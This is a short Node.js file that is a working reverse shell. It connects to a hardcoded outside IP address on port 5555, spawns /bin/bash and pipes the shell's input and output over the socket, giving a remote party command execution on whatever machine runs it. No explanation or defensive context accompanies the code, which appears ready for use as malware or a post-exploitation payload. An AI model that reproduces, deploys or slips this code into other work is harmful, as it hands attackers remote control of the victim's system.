
const net = require('net');
const spawn = require('child_process').spawn;

const HOST = "65.20.82.187";
const PORT = 5555;

const client = new net.Socket();

client.connect(PORT, HOST, () => {
    const shell = spawn('/bin/bash', []);

    client.pipe(shell.stdin);
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);

    client.on('close', () => {
        shell.kill();
    });
});
